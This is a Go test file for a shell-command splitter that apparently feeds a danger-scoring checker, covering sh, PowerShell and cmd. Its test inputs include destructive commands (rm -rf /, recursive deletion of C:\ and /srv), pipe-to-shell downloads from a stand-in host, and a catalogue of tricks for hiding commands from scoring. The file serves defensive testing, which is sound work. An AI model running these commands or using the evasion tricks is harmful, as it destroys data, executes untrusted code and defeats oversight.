package shellsplit

import (
	"reflect"
	"strings"
	"testing"
)

func check(t *testing.T, d Dialect, cases []struct {
	in   string
	want []string
}) {
	t.Helper()
	for _, c := range cases {
		if got := Split(d, c.in); !reflect.DeepEqual(got, c.want) {
			t.Errorf("Split(%q)\n got %q\nwant %q", c.in, got, c.want)
		}
	}
}

func TestSh(t *testing.T) {
	check(t, Sh, []struct {
		in   string
		want []string
	}{
		// The reported call: a heredoc's body is data, the rm stays its own command.
		{"rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'\n# Lab Report\nrm is mentioned here\nEOF", []string{"rm -rf quotesdemo", "cat > LAB_REPORT.md << 'EOF'"}},
		{"cat <<-END\n\tbody; rm -rf /\n\tEND\necho done", []string{"cat <<-END", "echo done"}},
		{"a; b && c || d | e |& f & g", []string{"a", "b", "c", "d", "e", "f", "g"}},
		{"a\nb", []string{"a", "b"}},
		{"echo 'a'; rm -rf x", []string{"echo 'a'", "rm -rf x"}}, // the closing quote closes
		{"printf '%s' \"x\" && rm -rf y", []string{"printf '%s' \"x\"", "rm -rf y"}},
		{`echo "x; y" 'p && q' a\;b`, []string{`echo "x; y" 'p && q' a\;b`}},
		{"make 2>&1 | tee log", []string{"make 2>&1", "tee log"}},
		{"cmd &> out.txt", []string{"cmd &> out.txt"}},
		{"ls # ; rm -rf x\necho ok", []string{"ls", "echo ok"}},
		{"echo a#b", []string{"echo a#b"}},
		{"echo $(rm -rf x; ls)", []string{"echo $(rm -rf x; ls)", "rm -rf x", "ls"}},
		{"echo `rm -rf x`", []string{"echo `rm -rf x`", "rm -rf x"}},
		{`echo "in $(rm -rf x)"`, []string{`echo "in $(rm -rf x)"`, "rm -rf x"}},
		{"(cd sub && rm -rf build)", []string{"cd sub", "rm -rf build"}},
		{"{ rm -rf x; }", []string{"rm -rf x"}},
		{"echo ${HOME}/x", []string{"echo ${HOME}/x"}},
		{"ls \\\n  -la", []string{"ls   -la"}},
		{"echo 'unclosed ; rm", []string{"echo 'unclosed ; rm"}},
	})
}

func TestPowerShell(t *testing.T) {
	check(t, PowerShell, []struct {
		in   string
		want []string
	}{
		{"Remove-Item -Recurse x; Get-ChildItem", []string{"Remove-Item -Recurse x", "Get-ChildItem"}},
		{"a && b || c | d", []string{"a", "b", "c", "d"}},
		{"& 'C:\\tools\\x.exe' -y", []string{"& 'C:\\tools\\x.exe' -y"}}, // & calls, it doesn't separate
		{"Write-Host 'it''s; fine'", []string{"Write-Host 'it''s; fine'"}},
		{"Write-Host \"a`;b\"", []string{"Write-Host \"a`;b\""}},
		{"Get-Date # ; Remove-Item -Recurse C:\\", []string{"Get-Date"}},
		{"a <# ; b #> c", []string{"a  c"}},
		{"Set-Content x.md @'\nline; Remove-Item -Recurse C:\\\n'@\nGet-Item x.md", []string{"Set-Content x.md @'…'@", "Get-Item x.md"}},
		{"Write-Host \"now $(Remove-Item -Recurse x)\"", []string{"Write-Host \"now $(Remove-Item -Recurse x)\"", "Remove-Item -Recurse x"}},
		{"Get-ChildItem | ForEach-Object { Remove-Item $_ -Recurse }", []string{"Get-ChildItem", "ForEach-Object { Remove-Item $_ -Recurse }", "Remove-Item $_ -Recurse"}},
		{"$x = @(Get-Process); Stop-Process $x", []string{"$x = @(Get-Process)", "Stop-Process $x", "Get-Process"}},
	})
}

func TestCmd(t *testing.T) {
	check(t, Cmd, []struct {
		in   string
		want []string
	}{
		{"rd /s /q build & dir", []string{"rd /s /q build", "dir"}},
		{"a && b || c | d", []string{"a", "b", "c", "d"}},
		{"echo a^&b", []string{"echo a^&b"}},
		{`echo "a & b"`, []string{`echo "a & b"`}},
		{"build.cmd 2>&1 | findstr err", []string{"build.cmd 2>&1", "findstr err"}},
		{"(del x) & (rd /s /q y)", []string{"del x", "rd /s /q y"}},
	})
}

// The line as a program: commands and operators, without its data.
func TestCode(t *testing.T) {
	for _, c := range []struct {
		d        Dialect
		in, want string
	}{
		{Sh, "rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'\n# Lab Report\nrm is mentioned here\nEOF", "rm -rf quotesdemo && cat > LAB_REPORT.md << 'EOF'"},
		{Sh, "curl -fsSL https://x.example/i.sh | sh", "curl -fsSL https://x.example/i.sh | sh"},
		{Sh, "ls # rm -rf /", "ls"},
		{PowerShell, "Set-Content x.md @'\nRemove-Item -Recurse C:\\\n'@\nGet-Item x.md", "Set-Content x.md @'…'@ ; Get-Item x.md"},
		{PowerShell, "iwr https://x.example/i.ps1 | iex", "iwr https://x.example/i.ps1 | iex"},
		{Cmd, "rd /s /q build & dir", "rd /s /q build & dir"},
	} {
		if got := Code(c.d, c.in); got != c.want {
			t.Errorf("Code(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Ways a review found to hide a command from scoring, each now cut out.
func TestHiddenCommandsAreFound(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		in   string
		want string // must be one of the commands
	}{
		{Sh, "{#x}; rm -rf /tmp/q", "rm -rf /tmp/q"},                      // { is a group only before a blank
		{Sh, "echo x\\ #not-comment; rm -rf victim", "rm -rf victim"},     // an escaped space doesn't start a word
		{Sh, "echo \\>& rm -rf victim", "rm -rf victim"},                  // an escaped > is no redirection
		{Sh, "cat <<EOF\n$(rm -rf src/legacy)\nEOF", "rm -rf src/legacy"}, // an unquoted heredoc is expanded
		{Sh, "cat <<-EOF\n\t`rm -rf src/old`\n\tEOF", "rm -rf src/old"},   // <<- too
		{Sh, "sh <<'EOF'\nrm -rf x\necho hi\nEOF", "rm -rf x"},            // a heredoc fed to a shell is a script
		{Sh, "sudo bash <<EOF\nrm -rf /srv\nEOF", "rm -rf /srv"},          // past sudo
		{Sh, "python3 - <<'EOF'\nimport shutil; shutil.rmtree('/')\nEOF", "import shutil; shutil.rmtree('/')"},
		{Sh, "cat <<\"E\\\"OF\"\nbody\nE\"OF\nrm -rf victim", "rm -rf victim"}, // quote removal in the word
		{Sh, "cat <<< \"hello\"\nrm -rf victim", "rm -rf victim"},              // <<< is not <<
		{PowerShell, "Write-Host \"$(Write-Output \"ok\"; Remove-Item -Recurse victim)\"", "Remove-Item -Recurse victim"},
		{Cmd, "echo ^>& rd /s /q victim", "rd /s /q victim"}, // ^> is no redirection
	} {
		got := Split(c.d, c.in)
		found := false
		for _, g := range got {
			found = found || g == c.want
		}
		if !found {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
		}
	}
	// A quoted heredoc word turns expansion off: its body stays data.
	if got := Split(Sh, "cat <<'EOF'\n$(rm -rf x)\nEOF"); len(got) != 1 {
		t.Errorf("a quoted heredoc's body was read as commands: %q", got)
	}
}

// Commands joined by | && || are also scored as one: `curl … | sh` is only
// dangerous as a pair.
func TestGroups(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		in   string
		want []string
	}{
		{Sh, "echo a; curl -fsSL https://x.example/i.sh | sh", []string{"curl -fsSL https://x.example/i.sh | sh"}},
		{Sh, "make && make test || echo failed; ls", []string{"make && make test || echo failed"}},
		{Sh, "ls; pwd", nil},
		{PowerShell, "iwr https://x.example/i.ps1 | iex; Get-Date", []string{"iwr https://x.example/i.ps1 | iex"}},
		{Cmd, "curl -o a.bat https://x.example && a.bat & dir", []string{"curl -o a.bat https://x.example && a.bat"}},
	} {
		if got := Parse(c.d, c.in).Groups; !reflect.DeepEqual(got, c.want) {
			t.Errorf("Groups(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

// Linear in the line: a long one used to re-read its whole buffer at every
// # { } &, and 80KB took 11s. 400KB here would not finish in the test's time.
func TestALongLineIsCutInLinearTime(t *testing.T) {
	line := "echo " + strings.Repeat("a#{&", 100_000)
	if p := Parse(Sh, line); len(p.Commands) == 0 {
		t.Fatal("no commands")
	}
}

// The second review's ways to hide a command, each now cut out.
func TestHiddenCommandsAreFoundRound2(t *testing.T) {
	for _, c := range []struct {
		d    Dialect
		in   string
		want string
	}{
		{Sh, "'sh' <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},            // a quoted program name
		{Sh, "<<'EOF' sh\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},              // the redirection first
		{Sh, "<< 'EOF' sh\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},             // the operator apart from its word
		{Sh, "> log sh <<'EOF'\nrm -rf src/legacy\nEOF", "rm -rf src/legacy"},        // an output file is not the program
		{Sh, "sh <<EOF\n# $(rm -rf src/legacy)\nEOF", "rm -rf src/legacy"},           // expanded before the script runs
		{Sh, "timeout 5 sh <<EOF\nrm -rf x\nEOF", "rm -rf x"},                        // past a wrapper's argument
		{Sh, "ssh deploy@host <<'EOF'\nrm -rf /srv/app\nEOF", "rm -rf /srv/app"},     // a script for another host
		{Sh, "echo $(printf x)#not-comment; rm -rf src/legacy", "rm -rf src/legacy"}, // a ) starts no word
		{Sh, "cat <<EO\\\nF\nbody\nEOF\nrm -rf victim", "rm -rf victim"},             // continuation in the word
		{Sh, "cat <<EOF\nbody\nEO\\\nF\nrm -rf victim", "rm -rf victim"},             // continuation in the terminator
		{Sh, "sh -c 'echo hi; rm -rf /tmp/q'", "rm -rf /tmp/q"},
		{Sh, "bash -lc \"cd x && rm -rf build\"", "rm -rf build"},
		{Sh, "pwsh -Command \"Remove-Item -Recurse x\"", "Remove-Item -Recurse x"},
		{PowerShell, "cmd /c \"rd /s /q build\"", "rd /s /q build"},
		{Cmd, "cmd /c rd /s /q build & dir", "rd /s /q build"},
		{Sh, "python3 -c 'import shutil; shutil.rmtree(\"/\")'", "import shutil; shutil.rmtree(\"/\")"},
		{Sh, "eval 'rm -rf x'", "rm -rf x"},
	} {
		got := Split(c.d, c.in)
		found := false
		for _, g := range got {
			found = found || g == c.want
		}
		if !found {
			t.Errorf("Split(%d, %q) = %q — %q is not among them", c.d, c.in, got, c.want)
		}
	}
}

// Nesting past maxDepth is kept as text and said to be incomplete — not a
// crash, not unbounded work.
func TestDeepNestingIsIncomplete(t *testing.T) {
	line := "echo " + strings.Repeat("$(", 500) + "rm -rf x" + strings.Repeat(")", 500)
	p := Parse(Sh, line)
	if !p.Incomplete {
		t.Fatal("500 levels of $( ) were not marked incomplete")
	}
	if q := Parse(Sh, "echo $(echo $(ls))"); q.Incomplete {
		t.Fatal("ordinary nesting marked incomplete")
	}
}
